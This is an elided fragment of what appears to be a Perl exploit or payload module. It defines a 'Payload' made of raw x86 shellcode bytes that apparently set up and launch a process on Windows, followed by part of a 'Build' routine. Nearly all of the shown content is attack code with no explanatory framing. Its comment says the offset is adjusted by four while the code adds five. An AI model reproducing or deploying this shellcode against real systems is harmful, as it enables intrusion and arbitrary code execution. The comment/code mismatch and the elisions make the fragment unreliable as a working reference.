	...
	Payload       =>
		{
			...
			Payload =>
				...
				"\x83\xc6\x44\x50\x89\xe7\x80\x3e\x43\x74\x1a\x50\xad\x50\x89\xe0" .
				"\x6a\x04\x57\x6a\x04\x6a\x00\x50\x53\xff\x55\x08\xeb\xe8\xa0\x30" .
				"\x00\xfe\x7f\x88\x06\x6a\x54\x59\x29\xcc\x89\xe7\x57\xf3\xaa\x5f" .
				"\xc6\x07\x44\xfe\x47\x2c\xfe\x47\x2d\x8d\x5f\x44\x53\x57\x50\x50" .
				"\x6a\x10\x50\x50\x50\x56\x50\xff\x55\x00\xff\x55\x04"
		},
};
...
sub Build
{
	...
	# Adjust the offset by four to get the real offset
	$offset += 5;
